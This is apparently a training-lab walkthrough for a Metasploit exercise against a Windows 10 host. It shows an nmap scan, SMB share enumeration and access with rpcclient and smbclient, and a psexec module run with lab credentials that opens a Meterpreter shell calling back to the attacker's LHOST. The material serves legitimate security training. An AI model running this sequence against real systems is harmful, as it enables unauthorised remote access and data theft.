### Automating Payloads And Delivery With Metasploit Exercise
 
IP: 10.129.108.46
 
---
 
### Question 1:
What command language interpreter is used to establish a system shell session with the target?
 
Since I know that the target we would be establishing a system shell with is a Windows host, then we would be using PowerShell as the command language interpreter.
 
&#x1F6A9; found **PowerShell**.
 
---
 
### Question 2:
Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)
 
I start off by running an Nmap scan against the target, going aggressive for time and making sure to get all ports and a TCP scan to not miss anything.
 
```diff
+ $ sudo nmap -sT -A -p- 10.129.108.46
```
 
	PORT      STATE SERVICE      VERSION
	7/tcp     open  echo
	9/tcp     open  discard?
	13/tcp    open  daytime      Microsoft Windows USA daytime
	17/tcp    open  qotd         Windows qotd (English)
	19/tcp    open  chargen
	80/tcp    open  http         Microsoft IIS httpd 10.0
	| http-methods:
	|_  Potentially risky methods: TRACE
	|_http-title: IIS Windows
	|_http-server-header: Microsoft-IIS/10.0
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds Windows 10 Pro 18363 microsoft-ds (workgroup: WORKGROUP)
	2179/tcp  open  vmrdp?
	5040/tcp  open  unknown
	49664/tcp open  msrpc        Microsoft Windows RPC
	49665/tcp open  msrpc        Microsoft Windows RPC
	49666/tcp open  msrpc        Microsoft Windows RPC
	49667/tcp open  msrpc        Microsoft Windows RPC
	49668/tcp open  msrpc        Microsoft Windows RPC
	49669/tcp open  msrpc        Microsoft Windows RPC
	49670/tcp open  msrpc        Microsoft Windows RPC
	Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows
 
	Host script results:
	| smb-security-mode:
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	|_clock-skew: mean: 2h19m58s, deviation: 4h02m30s, median: -2s
	| smb-os-discovery:
	|   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)
	|   OS CPE: cpe:/o:microsoft:windows_10::-
	|   Computer name: Shells-Win10
	|   NetBIOS computer name: SHELLS-WIN10\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2026-08-18T18:26:16-07:00
	| smb2-security-mode:
	|   3:1:1:
	|_    Message signing enabled but not required
	| smb2-time:
	|   date: 2026-08-19T01:2
 
SMB looks interesting, and since I've been given credentials to authenticate with, I can test connecting to it using smbclient, but first I want to view the shares with rpcclient.
 
```diff
+ $ rpcclient -U "htb-student" 10.129.108.46
+ rpcclient $> netshareenumall
```
 
	netname: ADMIN$
		remark:	Remote Admin
		path:	C:\Windows
		password:	(null)
	netname: C$
		remark:	Default share
		path:	C:\
		password:	(null)
	netname: IPC$
		remark:	Remote IPC
		path:
		password:	(null)
 
Seeing that C$ is mounted at root, I can pass that to smbclient and go from there.
 
```diff
+ $ smbclient -U "htb-student" //10.129.108.46/C$
```
 
	smb: \>
 
From here I take a look into the Users directory, then htb-student, and take a look at their Documents folder, which reveals staffsalaries.txt.
 
```diff
+ smb: \> cd Users\htb-student\Documents
+ smb: \Users\htb-student\Documents\> ls
```
 
Alternatively, I can use the Metasploit module used in the section, passing the username and password, the SMB share, and the rhosts and lhost.
 
```diff
+ [msf](Jobs:0 Agents:0) >> search exploit/windows/smb/psexec
+ [msf](Jobs:0 Agents:0) >> use exploit/windows/smb/psexec
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set RHOSTS 10.129.108.46
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set SMBPass HTB_@cademy_stdnt!
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set SMBUser htb-student
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set LHOST 10.10.14.75
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set SMBSHARE ADMIN$
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> run
```
 
	RHOSTS => 10.129.108.46
	SMBPass => HTB_@cademy_stdnt!
	SMBUser => htb-student
	LHOST => 10.10.14.75
	SMBSHARE => ADMIN$
	(Meterpreter 1)(C:\Windows\system32)
 
From here I can navigate to the same folder from earlier, C:\Users\htb-student\Documents, and find the same txt file.
 
```diff
+ (Meterpreter 1)(C:\Windows\system32) cd C:\Users\htb-student\Documents
+ (Meterpreter 1)(C:\Users\htb-student\Documents) ls
```
 
&#x1F6A9; found **staffsalaries.txt**.
